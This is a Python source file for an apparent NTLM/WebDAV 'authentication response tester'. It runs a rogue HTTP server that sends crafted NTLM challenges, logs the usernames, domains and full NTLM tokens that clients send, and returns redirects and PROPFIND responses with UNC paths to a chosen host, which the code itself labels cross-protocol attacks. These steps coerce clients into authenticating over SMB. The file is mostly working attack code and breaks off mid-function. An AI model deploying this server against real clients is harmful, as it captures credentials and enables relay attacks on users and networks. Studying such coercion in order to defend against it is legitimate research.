#!/usr/bin/env python3
"""
HTTP/WebDAV Authentication Response Tester with NTLM Challenge Generation
Tests various HTTP auth responses to trigger different client behaviors
Includes UNC path injection to test cross-protocol CMTI auth
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import argparse
import base64
import time
import sys
import struct
import os

class TeeLogger:
    """Write to both stdout and file"""
    def __init__(self, filename):
        self.terminal = sys.stdout
        self.log = open(filename, 'a')

    def write(self, message):
        self.terminal.write(message)
        self.log.write(message)
        self.log.flush()

    def flush(self):
        self.terminal.flush()
        self.log.flush()

def generate_ntlm_challenge(negotiate_flags=None):
    """
    Generate a proper NTLM Type 2 CHALLENGE message
    """
    # NTLM Type 2 structure
    signature = b'NTLMSSP\x00'
    message_type = struct.pack('<I', 2)  # Type 2

    # Target name (server name) - use a realistic server name
    target_name = b'WEBDAV-SERVER'  # Will be converted to UTF-16LE below
    target_name_utf16 = target_name.decode('ascii').encode('utf-16-le')
    target_name_len = struct.pack('<H', len(target_name_utf16))
    target_name_max_len = struct.pack('<H', len(target_name_utf16))
    # TargetName comes after the fixed 48-byte header + 8-byte version = offset 56
    target_name_offset = struct.pack('<I', 56)

    # Flags - mirror client flags or use defaults
    if negotiate_flags:
        # Mirror the client's flags but ensure we have the ones we want
        flags = negotiate_flags
        # Ensure these are set for testing
        flags |= 0x00000001  # NEGOTIATE_UNICODE
        flags |= 0x00000002  # NEGOTIATE_OEM
        flags |= 0x00000200  # NEGOTIATE_NTLM
        flags |= 0x00008000  # NEGOTIATE_ALWAYS_SIGN
        flags |= 0x00080000  # NEGOTIATE_EXTENDED_SESSIONSECURITY
        flags |= 0x02000000  # NEGOTIATE_VERSION
        # CRITICAL: Add these flags that real IIS servers always set
        flags |= 0x00800000  # NEGOTIATE_TARGET_INFO (tells client TargetInfo is present)
        flags |= 0x00020000  # TARGET_TYPE_SERVER (identifies this as a server, not domain)
        # Note: SIGN flag is already in client flags (0x10), keep it mirrored
    else:
        # Default flags matching real IIS server
        flags = 0xa2898205
        flags |= 0x00800000  # NEGOTIATE_TARGET_INFO
        flags |= 0x00020000  # TARGET_TYPE_SERVER

    flags_bytes = struct.pack('<I', flags)

    # Challenge (8 bytes) - random
    challenge = os.urandom(8)

    # Reserved (8 bytes)
    reserved = b'\x00' * 8

    # Target Info (AV_PAIRS) - minimal but valid structure
    # AV_PAIR format: Type(2 bytes) + Length(2 bytes) + Value
    # We'll include NetBIOS name and DNS name, then terminator
    AV_EOL = 0x0000
    AV_NETBIOS_COMPUTER_NAME = 0x0001
    AV_NETBIOS_DOMAIN_NAME = 0x0002

    netbios_name = b'WEBDAV-SERVER'.decode('ascii').encode('utf-16-le')
    domain_name = b'WORKGROUP'.decode('ascii').encode('utf-16-le')

    target_info = (
        struct.pack('<HH', AV_NETBIOS_COMPUTER_NAME, len(netbios_name)) + netbios_name +
        struct.pack('<HH', AV_NETBIOS_DOMAIN_NAME, len(domain_name)) + domain_name +
        struct.pack('<HH', AV_EOL, 0)  # Terminator
    )

    target_info_len = struct.pack('<H', len(target_info))
    target_info_max_len = struct.pack('<H', len(target_info))
    # TargetInfo comes after TargetName in the payload
    target_info_offset = struct.pack('<I', 56 + len(target_name_utf16))

    # Version (8 bytes) - Windows 10.0 build 20348
    version = struct.pack('<BBHBBBB', 10, 0, 20348, 0, 0, 0, 15)

    # Build the message
    challenge_msg = (
        signature +
        message_type +
        target_name_len + target_name_max_len + target_name_offset +
        flags_bytes +
        challenge +
        reserved +
        target_info_len + target_info_max_len + target_info_offset +
        version +
        target_name_utf16 +  # Use UTF-16LE encoded name
        target_info
    )

    return challenge_msg, flags

class AuthTesterHandler(BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        print(f"[*] {self.address_string()} - {format % args}")

    def do_GET(self):
        self.handle_request()

    def do_POST(self):
        self.handle_request()

    def do_PROPFIND(self):
        self.handle_request()

    def do_PROPPATCH(self):
        self.handle_request()

    def do_MKCOL(self):
        self.handle_request()

    def do_COPY(self):
        self.handle_request()

    def do_MOVE(self):
        self.handle_request()

    def do_LOCK(self):
        self.handle_request()

    def do_UNLOCK(self):
        self.handle_request()

    def do_OPTIONS(self):
        self.handle_request()

    def handle_request(self):
        auth_header = self.headers.get('Authorization', '')

        print(f"\n{'='*80}")
        print(f"[+] Request #{self.server.request_count} from {self.client_address[0]} at {time.strftime('%Y-%m-%d %H:%M:%S')}")
        self.server.request_count += 1
        print(f"    Method: {self.command}")
        print(f"    Path: {self.path}")
        print(f"    User-Agent: {self.headers.get('User-Agent', 'N/A')}")
        print(f"    Host: {self.headers.get('Host', 'N/A')}")
        print(f"    Translate: {self.headers.get('translate', 'N/A')}")
        print(f"    Depth: {self.headers.get('Depth', 'N/A')}")
        print(f"    Connection: {self.headers.get('Connection', 'N/A')}")

        # Print ALL headers for analysis
        print(f"    All Headers:")
        for header, value in self.headers.items():
            if header.lower() != 'authorization':
                print(f"      {header}: {value}")

        print(f"    Authorization: {auth_header[:60]}..." if auth_header else "    No Authorization header")

        # Parse NTLM message type if present
        ntlm_info = {}
        parsed_type1_flags = None

        if auth_header.startswith('NTLM ') or auth_header.startswith('Negotiate '):
            try:
                token = base64.b64decode(auth_header.split(' ')[1])
                ntlm_info['token_length'] = len(token)
                ntlm_info['token_hex'] = token.hex()

                if len(token) >= 12:
                    msg_type = int.from_bytes(token[8:12], 'little')
                    ntlm_info['message_type'] = msg_type
                    print(f"    NTLM Message Type: {msg_type}")

                    if msg_type == 1:
                        # Type 1 - NEGOTIATE
                        flags = int.from_bytes(token[12:16], 'little')
                        ntlm_info['type1_flags'] = flags
                        parsed_type1_flags = flags  # Save for challenge generation
                        print(f"    Type 1 Flags: {flags:#010x}")
                        print(f"      SIGN (0x10): {bool(flags & 0x10)}")
                        print(f"      SEAL (0x20): {bool(flags & 0x20)}")
                        print(f"      ALWAYS_SIGN (0x8000): {bool(flags & 0x8000)}")
                        print(f"      KEY_EXCH (0x40000000): {bool(flags & 0x40000000)}")
                    elif msg_type == 3:
                        # Type 3 - AUTHENTICATE
                        if len(token) >= 64:
                            flags = int.from_bytes(token[60:64], 'little')
                            ntlm_info['type3_flags'] = flags
                            print(f"    Type 3 Flags: {flags:#010x}")
                            print(f"      SIGN (0x10): {bool(flags & 0x10)}")
                            print(f"      SEAL (0x20): {bool(flags & 0x20)}")
                            print(f"      ALWAYS_SIGN (0x8000): {bool(flags & 0x8000)}")
                            print(f"      KEY_EXCH (0x40000000): {bool(flags & 0x40000000)}")

                            # Try to extract username, domain, workstation
                            try:
                                user_len = int.from_bytes(token[36:38], 'little')
                                user_offset = int.from_bytes(token[40:44], 'little')
                                domain_len = int.from_bytes(token[28:30], 'little')
                                domain_offset = int.from_bytes(token[32:36], 'little')
                                workstation_len = int.from_bytes(token[44:46], 'little')
                                workstation_offset = int.from_bytes(token[48:52], 'little')

                                username = ""
                                domain = ""
                                workstation = ""

                                if user_offset + user_len <= len(token):
                                    username = token[user_offset:user_offset+user_len].decode('utf-16-le', errors='ignore')
                                if domain_offset + domain_len <= len(token):
                                    domain = token[domain_offset:domain_offset+domain_len].decode('utf-16-le', errors='ignore')
                                if workstation_offset + workstation_len <= len(token):
                                    workstation = token[workstation_offset:workstation_offset+workstation_len].decode('utf-16-le', errors='ignore')

                                ntlm_info['domain'] = domain
                                ntlm_info['username'] = username
                                ntlm_info['workstation'] = workstation

                                print(f"      Domain: '{domain}' (length={len(domain)})")
                                print(f"      Username: '{username}' (length={len(username)})")
                                print(f"      Workstation: '{workstation}' (length={len(workstation)})")

                                if len(username) == 0 and len(domain) == 0:
                                    print(f"      *** POTENTIAL LOCAL AUTH - EMPTY CREDENTIALS ***")
                                    ntlm_info['potential_local_auth'] = True
                                else:
                                    ntlm_info['potential_local_auth'] = False
                            except Exception as e:
                                print(f"      Error extracting user/domain: {e}")

                        # Print full token for analysis
                        print(f"    Full NTLM Token (base64): {auth_header.split(' ')[1]}")
                        print(f"    Full NTLM Token (hex): {token.hex()}")
            except Exception as e:
                print(f"    Error parsing NTLM: {e}")

        # Store request info
        if not hasattr(self.server, 'all_requests'):
            self.server.all_requests = []

        request_info = {
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'request_num': self.server.request_count - 1,
            'method': self.command,
            'path': self.path,
            'client_ip': self.client_address[0],
            'headers': dict(self.headers),
            'ntlm_info': ntlm_info
        }
        self.server.all_requests.append(request_info)

        # In --all mode, cycle through responses
        if self.server.all_mode:
            mode = self.server.all_modes[self.server.all_mode_index]
            self.server.all_mode_index = (self.server.all_mode_index + 1) % len(self.server.all_modes)
            print(f"    [ALL MODE] Using response mode: {mode}")
        else:
            mode = self.server.mode

        # Get CMTI address if provided
        cmti = self.server.cmti

        response_map = {
            # Standard auth responses with proper NTLM challenges
            'ntlm_401': lambda: self.send_ntlm_401(parsed_type1_flags),
            'negotiate_401': lambda: self.send_negotiate_401(parsed_type1_flags),
            'basic_401': self.send_basic_401,
            'digest_401': self.send_digest_401,
            'multi_401': lambda: self.send_multi_401(parsed_type1_flags),

            # Proxy responses
            'proxy_407': lambda: self.send_proxy_407(parsed_type1_flags),
            'proxy_negotiate_407': lambda: self.send_proxy_negotiate_407(parsed_type1_flags),

            # Redirects to localhost/loopback
            'redirect_localhost': lambda: self.send_redirect('http://localhost/'),
            'redirect_127': lambda: self.send_redirect('http://127.0.0.1/'),
            'redirect_loopback': lambda: self.send_redirect('http://[::1]/'),
            'redirect_localwithauth': lambda: self.send_redirect_with_auth('http://127.0.0.1/', parsed_type1_flags),

            # Redirects to self with different formats
            'redirect_self_host': lambda: self.send_redirect(f'http://{self.headers.get("Host", "localhost")}/test'),
            'redirect_davwwwroot': lambda: self.send_redirect('/DavWWWRoot' + self.path),

            # CMTI-specific redirects
            'redirect_cmti': lambda: self.send_redirect(f'http://{cmti}/' if cmti else 'http://localhost/'),
            'redirect_cmti_davwwwroot': lambda: self.send_redirect(f'http://{cmti}/DavWWWRoot/' if cmti else 'http://localhost/DavWWWRoot/'),
            'redirect_cmti_withauth': lambda: self.send_redirect_with_auth(f'http://{cmti}/' if cmti else 'http://localhost/', parsed_type1_flags),
            'redirect_cmti_port80': lambda: self.send_redirect(f'http://{cmti}:80/' if cmti else 'http://localhost:80/'),
            'redirect_cmti_scheme_only': lambda: self.send_redirect(f'//{cmti}/' if cmti else '//localhost/'),

            # WebDAV specific
            'webdav_multistatus': lambda: self.send_webdav_multistatus(parsed_type1_flags),
            'webdav_multistatus_cmti': lambda: self.send_webdav_multistatus_cmti(cmti, parsed_type1_flags),
            'webdav_locked': lambda: self.send_webdav_locked(parsed_type1_flags),
            'webdav_insufficient_storage': lambda: self.send_webdav_insufficient_storage(parsed_type1_flags),
            'webdav_method_not_allowed': lambda: self.send_webdav_method_not_allowed(parsed_type1_flags),

            # UNC/CMTI cross-protocol tricks
            'propfind_unc_cmti': lambda: self.send_propfind_with_unc_cmti(cmti),
            'propfind_unc_redirect': lambda: self.send_propfind_with_redirect_to_unc(cmti),
            'propfind_collection_unc': lambda: self.send_propfind_collection_with_unc(cmti),
            'location_unc': lambda: self.send_location_header_unc(cmti),
            'propfind_unc_pipe': lambda: self.send_propfind_unc_pipe(cmti),
            'propfind_unc_variants': lambda: self.send_propfind_unc_variants(cmti),

            # Alternative status codes
            'auth_408': lambda: self.send_408_timeout(parsed_type1_flags),
            'auth_511': lambda: self.send_511_network_auth(parsed_type1_flags),
            'auth_426': lambda: self.send_426_upgrade(parsed_type1_flags),
            'auth_305': self.send_305_use_proxy,

            # Custom header combinations
            'persist_auth': lambda: self.send_persistent_auth(parsed_type1_flags),
            'negotiate_krb_only': self.send_negotiate_kerberos_only,
            'ntlm_no_negotiate': lambda: self.send_ntlm_only(parsed_type1_flags),
            'challenge_local_call': lambda: self.send_challenge_with_local_flag(parsed_type1_flags),

            # Combined approaches
            'redirect_then_auth': lambda: self.send_redirect_then_auth(parsed_type1_flags),
            'auth_with_location': lambda: self.send_auth_with_location(cmti, parsed_type1_flags),
        }

        handler = response_map.get(mode, lambda: self.send_ntlm_401(parsed_type1_flags))
        handler()

    def send_ntlm_401(self, client_flags=None):
        """Standard 401 with proper NTLM Type 2 challenge"""
        self.send_response(401)

        if client_flags is not None:
            # Client sent Type 1, send Type 2 challenge
            challenge_msg, flags = generate_ntlm_challenge(client_flags)
            challenge_b64 = base64.b64encode(challenge_msg).decode('ascii')
            self.send_header('WWW-Authenticate', f'NTLM {challenge_b64}')
            print(f"    Response: 401 with NTLM Type 2 Challenge (flags: {flags:#010x})")
            print(f"    Challenge (base64): {challenge_b64}")
        else:
            # No Type 1 yet, just ask for NTLM
            self.send_header('WWW-Authenticate', 'Negotiate')
            self.send_header('WWW-Authenticate', 'NTLM')
            print(f"    Response: 401 with NTLM/Negotiate (no challenge yet)")

        self.send_header('Connection', 'keep-alive')
        self.send_header('Content-Length', '0')
        self.end_headers()

    def send_negotiate_401(self, client_flags=None):
        """401 with Negotiate and proper challenge"""
        self.send_response(401)

        if client_flags is not None:
            challenge_msg, flags = generate_ntlm_challenge(client_flags)
            challenge_b64 = base64.b64encode(challenge_msg).decode('ascii')
            self.send_header('WWW-Authenticate', f'Negotiate {challenge_b64}')
            print(f"    Response: 401 with Negotiate Type 2 Challenge (flags: {flags:#010x})")
        else:
            self.send_header('WWW-Authenticate', 'Negotiate')
            print(f"    Response: 401 with Negotiate only")

        self.send_header('Content-Length', '0')
        self.end_headers()

    def send_basic_401(self):
        """401 with Basic auth"""
        self.send_response(401)
        self.send_header('WWW-Authenticate', 'Basic realm="localhost"')
        self.send_header('Content-Length', '0')
        self.end_headers()
        print("    Response: 401 with Basic auth")

    def send_digest_401(self):
        """401 with Digest auth"""
        self.send_response(401)
        self.send_header('WWW-Authenticate', 'Digest realm="localhost", qop="auth", nonce="dcd98b7102dd2f0e8b11d0f600bfb0c093"')
        self.send_header('Content-Length', '0')
        self.end_headers()
        print("    Response: 401 with Digest auth")

    def send_multi_401(self, client_flags=None):
        """401 with multiple auth schemes"""
        self.send_response(401)

        if client_flags is not None:
            challenge_msg, flags = generate_ntlm_challenge(client_flags)
            challenge_b64 = base64.b64encode(challenge_msg).decode('ascii')
            self.send_header('WWW-Authenticate', f'Negotiate {challenge_b64}')
            self.send_header('WWW-Authenticate', f'NTLM {challenge_b64}')
            print(f"    Response: 401 with Negotiate + NTLM challenges + Basic")
        else:
            self.send_header('WWW-Authenticate', 'Negotiate')
            self.send_header('WWW-Authenticate', 'NTLM')

        self.send_header('WWW-Authenticate', 'Basic realm="localhost"')
        self.send_header('Content-Length', '0')
        self.end_headers()
        if client_flags is None:
            print("    Response: 401 with Negotiate + NTLM + Basic")

    def send_proxy_407(self, client_flags=None):
        """407 Proxy Authentication Required with NTLM challenge"""
        self.send_response(407)

        if client_flags is not None:
            challenge_msg, flags = generate_ntlm_challenge(client_flags)
            challenge_b64 = base64.b64encode(challenge_msg).decode('ascii')
            self.send_header('Proxy-Authenticate', f'NTLM {challenge_b64}')
            print(f"    Response: 407 Proxy with NTLM Type 2 Challenge")
        else:
            self.send_header('Proxy-Authenticate', 'NTLM')
            self.send_header('Proxy-Authenticate', 'Negotiate')
            print(f"    Response: 407 Proxy Authentication Required")

        self.send_header('Content-Length', '0')
        self.end_headers()

    def send_proxy_negotiate_407(self, client_flags=None):
        """407 with Negotiate"""
        self.send_response(407)

        if client_flags is not None:
            challenge_msg, flags = generate_ntlm_challenge(client_flags)
            challenge_b64 = base64.b64encode(challenge_msg).decode('ascii')
            self.send_header('Proxy-Authenticate', f'Negotiate {challenge_b64}')
            print(f"    Response: 407 Proxy with Negotiate Type 2 Challenge")
        else:
            self.send_header('Proxy-Authenticate', 'Negotiate')
            print(f"    Response: 407 with Negotiate only")

        self.send_header('Content-Length', '0')
        self.end_headers()

    def send_redirect(self, location):
        """302 redirect"""
        self.send_response(302)
        self.send_header('Location', location)
        self.send_header('Content-Length', '0')
        self.end_headers()
        print(f"    Response: 302 redirect to {location}")

    def send_redirect_with_auth(self, location, client_flags=None):
        """302 redirect with auth challenge"""
        self.send_response(302)
        self.send_header('Location', location)

        if client_flags is not None:
            challenge_msg, flags = generate_ntlm_challenge(client_flags)
            challenge_b64 = base64.b64encode(challenge_msg).decode('ascii')
            self.send_header('WWW-Authenticate', f'NTLM {challenge_b64}')
            print(f"    Response: 302 redirect to {location} with NTLM challenge")
        else:
            self.send_header('WWW-Authenticate', 'NTLM')
            print(f"    Response: 302 redirect to {location} with auth")

        self.send_header('Content-Length', '0')
        self.end_headers()

    def send_webdav_multistatus(self, client_flags=None):
        """207 Multi-Status WebDAV response"""
        body = b'''<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:">
<D:response>
<D:href>/</D:href>
<D:propstat>
<D:status>HTTP/1.1 401 Unauthorized</D:status>
</D:propstat>
</D:response>
</D:multistatus>'''
        self.send_response(207)
        self.send_header('Content-Type', 'application/xml; charset="utf-8"')

        if client_flags is not None:
            challenge_msg, flags = generate_ntlm_challenge(client_flags)
            challenge_b64 = base64.b64encode(challenge_msg).decode('ascii')
            self.send_header('WWW-Authenticate', f'NTLM {challenge_b64}')
            print(f"    Response: 207 Multi-Status with NTLM challenge")
        else:
            self.send_header('WWW-Authenticate', 'NTLM')
            print(f"    Response: 207 Multi-Status with auth requirement")

        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def send_webdav_multistatus_cmti(self, cmti, client_flags=None):
        """207 Multi-Status with CMTI redirect"""
        href = f'http://{cmti}/' if cmti else 'http://localhost/'
        body = f'''<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:">
<D:response>
<D:href>{href}</D:href>
<D:propstat>
<D:status>HTTP/1.1 401 Unauthorized</D:status>
</D:propstat>
</D:response>
</D:multistatus>'''.encode('utf-8')
        self.send_response(207)
        self.send_header('Content-Type', 'application/xml; charset="utf-8"')

        if client_flags is not None:
            challenge_msg, flags = generate_ntlm_challenge(client_flags)
            challenge_b64 = base64.b64encode(challenge_msg).decode('ascii')
            self.send_header('WWW-Authenticate', f'NTLM {challenge_b64}')
            print(f"    Response: 207 Multi-Status with CMTI href + NTLM challenge: {href}")
        else:
            self.send_header('WWW-Authenticate', 'NTLM')
            print(f"    Response: 207 Multi-Status with CMTI href: {href}")

        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def send_webdav_locked(self, client_flags=None):
        """423 Locked WebDAV response"""
        self.send_response(423)

        if client_flags is not None:
            challenge_msg, flags = generate_ntlm_challenge(client_flags)
            challenge_b64 = base64.b64encode(challenge_msg).decode('ascii')
            self.send_header('WWW-Authenticate', f'NTLM {challenge_b64}')
            print(f"    Response: 423 Locked with NTLM challenge")
        else:
            self.send_header('WWW-Authenticate', 'NTLM')
            print(f"    Response: 423 Locked with NTLM")

        self.send_header('Content-Length', '0')
        self.end_headers()

    def send_webdav_insufficient_storage(self, client_flags=None):
        """507 Insufficient Storage"""
        self.send_response(507)

        if client_flags is not None:
            challenge_msg, flags = generate_ntlm_challenge(client_flags)
            challenge_b64 = base64.b64encode(challenge_msg).decode('ascii')
            self.send_header('WWW-Authenticate', f'NTLM {challenge_b64}')
            print(f"    Response: 507 Insufficient Storage with NTLM challenge")
        else:
            self.send_header('WWW-Authenticate', 'NTLM')
            print(f"    Response: 507 Insufficient Storage with NTLM")

        self.send_header('Content-Length', '0')
        self.end_headers()

    def send_webdav_method_not_allowed(self, client_flags=None):
        """405 Method Not Allowed"""
        self.send_response(405)
        self.send_header('Allow', 'PROPFIND, OPTIONS, GET')

        if client_flags is not None:
            challenge_msg, flags = generate_ntlm_challenge(client_flags)
            challenge_b64 = base64.b64encode(challenge_msg).decode('ascii')
            self.send_header('WWW-Authenticate', f'NTLM {challenge_b64}')
            print(f"    Response: 405 Method Not Allowed with NTLM challenge")
        else:
            self.send_header('WWW-Authenticate', 'NTLM')
            print(f"    Response: 405 Method Not Allowed with NTLM")

        self.send_header('Content-Length', '0')
        self.end_headers()

    def send_propfind_with_unc_cmti(self, cmti):
        """PROPFIND response with UNC path containing CMTI"""
        if not cmti:
            cmti = "localhost"

        unc_path = f"\\\\{cmti}\\share\\file.txt"

        body = f'''<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:">
<D:response>
<D:href>{unc_path}</D:href>
<D:propstat>
<D:prop>
<D:displayname>Test File</D:displayname>
<D:getcontentlength>1024</D:getcontentlength>
<D:resourcetype/>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>'''.encode('utf-8')

        self.send_response(207)
        self.send_header('Content-Type', 'application/xml; charset="utf-8"')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)
        print(f"    Response: 207 Multi-Status with UNC path: {unc_path}")
        print(f"    *** CROSS-PROTOCOL ATTACK: Client may initiate SMB to UNC path ***")

    def send_propfind_with_redirect_to_unc(self, cmti):
        """PROPFIND response with redirect href to UNC"""
        if not cmti:
            cmti = "localhost"

        unc_path = f"\\\\{cmti}\\DavWWWRoot\\test"

        body = f'''<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:">
<D:response>
<D:href>{unc_path}</D:href>
<D:propstat>
<D:prop>
<D:displayname>Redirected Resource</D:displayname>
</D:prop>
<D:status>HTTP/1.1 301 Moved Permanently</D:status>
</D:propstat>
</D:response>
</D:multistatus>'''.encode('utf-8')

        self.send_response(207)
        self.send_header('Content-Type', 'application/xml; charset="utf-8"')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)
        print(f"    Response: 207 Multi-Status with redirect to UNC: {unc_path}")
        print(f"    *** CROSS-PROTOCOL ATTACK: Client may initiate SMB to UNC path ***")

    def send_propfind_collection_with_unc(self, cmti):
        """PROPFIND response with collection containing UNC paths"""
        if not cmti:
            cmti = "localhost"

        body = f'''<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:">
<D:response>
<D:href>/folder/</D:href>
<D:propstat>
<D:prop>
<D:resourcetype><D:collection/></D:resourcetype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
<D:response>
<D:href>\\\\{cmti}\\share\\document.txt</D:href>
<D:propstat>
<D:prop>
<D:displayname>document.txt</D:displayname>
<D:getcontentlength>2048</D:getcontentlength>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
<D:response>
<D:href>\\\\{cmti}\\PIPE\\srvsvc</D:href>
<D:propstat>
<D:prop>
<D:displayname>srvsvc</D:displayname>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>'''.encode('utf-8')

        self.send_response(207)
        self.send_header('Content-Type', 'application/xml; charset="utf-8"')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)
        print(f"    Response: 207 Multi-Status with collection containing UNC paths to {cmti}")
        print(f"    *** CROSS-PROTOCOL ATTACK: Client may initiate SMB to multiple UNC paths ***")

    def send_location_header_unc(self, cmti):
        """302 redirect with Location header pointing to UNC"""
        if not cmti:
            cmti = "localhost"

        unc_path = f"file:///{cmti}/share/test.txt"

        self.send_response(302)
        self.send_header('Location', unc_path)
        self.send_header('Content-Length', '0')
        self.end_headers()
        print(f"    Response: 302 redirect to UNC (file://): {unc_path}")
        print(f"    *** CROSS-PROTOCOL ATTACK: Client may follow file:// UNC ***")

    def send_propfind_unc_pipe(self, cmti):
        """PROPFIND response with UNC path to named pipe"""
        if not cmti:
            cmti = "localhost"

        unc_pipe = f"\\\\{cmti}\\PIPE\\srvsvc"
        unc_ipc = f"\\\\{cmti}\\IPC$"

        body = f'''<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:">
<D:response>
<D:href>{unc_pipe}</D:href>
<D:propstat>
<D:prop>
<D:displayname>srvsvc Named Pipe</D:displayname>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
<D:response>
<D:href>{unc_ipc}</D:href>
<D:propstat>
<D:prop>
<D:displayname>IPC Share</D:displayname>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>'''.encode('utf-8')

        self.send_response(207)
        self.send_header('Content-Type', 'application/xml; charset="utf-8"')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)
        print(f"    Response: 207 Multi-Status with UNC PIPE paths: {unc_pipe}, {unc_ipc}")
        print(f"    *** CROSS-PROTOCOL ATTACK: Client may initiate SMB IPC$ connection ***")

    def send_propfind_unc_variants(self, cmti):
        """PROPFIND response with various UNC path formats"""
        if not cmti:
            cmti = "localhost"

        body = f'''<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:">
<D:response>
<D:href>\\\\{cmti}\\share\\test.txt</D:href>
<D:propstat>
<D:prop><D:displayname>Standard UNC</D:displayname></D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
<D:response>
<D:href>file://{cmti}/share/test.txt</D:href>
<D:propstat>
<D:prop><D:displayname>file:// format</D:displayname></D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
<D:response>
<D:href>\\\\{cmti}@80\\share\\test.txt</D:href>
<D:propstat>
<D:prop><D:displayname>UNC with @80</D:displayname></D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
<D:response>
<D:href>\\\\{cmti}@445\\share\\test.txt</D:href>
<D:propstat>
<D:prop><D:displayname>UNC with @445</D:displayname></D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>'''.encode('utf-8')

        self.send_response(207)
        self.send_header('Content-Type', 'application/xml; charset="utf-8"')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)
        print(f"    Response: 207 Multi-Status with UNC path variants for {cmti}")
        print(f"    *** CROSS-PROTOCOL ATTACK: Testing multiple UNC formats ***")

    def send_408_timeout(self, client_flags=None):
        """408 Request Timeout with auth"""
        self.send_response(408)

        if client_flags is not None:
            challenge_msg, flags = generate_ntlm_challenge(client_flags)
            challenge_b64 = base64.b64encode(challenge_msg).decode('ascii')
            self.send_header('WWW-Authenticate', f'NTLM {challenge_b64}')
            print(f"    Response: 408 Request Timeout with NTLM challenge")
        else:
            self.send_header('WWW-Authenticate', 'NTLM')
            print(f"    Response: 408 Request Timeout with NTLM")

        self.send_header('Content-Length', '0')
        self.end_headers()

    def send_511_network_auth(self, client_flags=None):
        """511 Network Authentication Required"""
        self.send_response(511)

        if client_flags is not None:
            challenge_msg, flags = generate_ntlm_challenge(client_flags)
            challenge_b64 = base64.b64encode(challenge_msg).decode('ascii')
            self.send_header('WWW-Authenticate', f'NTLM {challenge_b64}')
            print(f"    Response: 511 Network Authentication with NTLM challenge")
        else:
            self.send_header('WWW-Authenticate', 'NTLM')
            print(f"    Response: 511 Network Authentication Required")

        self.send_header('Content-Length', '0')
        self.end_headers()

    def send_426_upgrade(self, client_flags=None):
        """426 Upgrade Required"""
        self.send_response(426)
        self.send_header('Upgrade', 'NTLM/1.0')

        if client_flags is not None:
            challenge_msg, flags = generate_ntlm_challenge(client_flags)
            challenge_b64 = base64.b64encode(challenge_msg).decode('ascii')
            self.send_header('WWW-Authenticate', f'NTLM {challenge_b64}')
            print(f"    Response: 426 Upgrade Required with NTLM challenge")
        else:
            self.send_header('WWW-Authenticate', 'NTLM')
            print(f"    Response: 426 Upgrade Required")

        self.send_header('Content-Length', '0')
        self.end_headers()

    def send_305_use_proxy(self):
        """305 Use Proxy"""
        self.send_response(305)
        self.send_header('Location', 'http://127.0.0.1/')
        self.send_header('Content-Length', '0')
        self.end_headers()
        print("    Response: 305 Use Proxy -> 127.0.0.1")

    def send_persistent_auth(self, client_flags=None):
        """401 with persistent connection and auth"""
        self.send_response(401)

        if client_flags is not None:
            challenge_msg, flags = generate_ntlm_challenge(client_flags)
            challenge_b64 = base64.b64encode(challenge_msg).decode('ascii')
            self.send_header('WWW-Authenticate', f'NTLM {challenge_b64}')
            print(f"    Response: 401 with persistent connection + NTLM challenge")
        else:
            self.send_header('WWW-Authenticate', 'NTLM')
            print(f"    Response: 401 with persistent connection")

        self.send_header('Connection', 'Keep-Alive')
        self.send_header('Keep-Alive', 'timeout=5, max=100')
        self.send_header('Persistent-Auth', 'true')
        self.send_header('Content-Length', '0')
        self.end_headers()

    def send_negotiate_kerberos_only(self):
        """401 with Negotiate but hint at Kerberos"""
        self.send_response(401)
        self.send_header('WWW-Authenticate', 'Negotiate')
        self.send_header('X-Negotiate-Protocol', 'Kerberos')
        self.send_header('Content-Length', '0')
        self.end_headers()
        print("    Response: 401 Negotiate (Kerberos hint)")

    def send_ntlm_only(self, client_flags=None):
        """401 with NTLM only (no Negotiate)"""
        self.send_response(401)

        if client_flags is not None:
            challenge_msg, flags = generate_ntlm_challenge(client_flags)
            challenge_b64 = base64.b64encode(challenge_msg).decode('ascii')
            self.send_header('WWW-Authenticate', f'NTLM {challenge_b64}')
            print(f"    Response: 401 with NTLM challenge only")
        else:
            self.send_header('WWW-Authenticate', 'NTLM')
            print(f"    Response: 401 with NTLM only")

        self.send_header('Content-Length', '0')
        self.end_headers()

    def send_challenge_with_local_flag(self, client_flags=None):
        """Send custom NTLM challenge with specific flags"""
        self.send_response(401)

        if client_flags is not None:
            challenge_msg, flags = generate_ntlm_challenge(client_flags)
            challenge_b64 = base64.b64encode(challenge_msg).decode('ascii')
            self.send_header('WWW-Authenticate', f'NTLM {challenge_b64}')
            self.send_header('X-NTLM-Context', 'LOCAL_CALL')
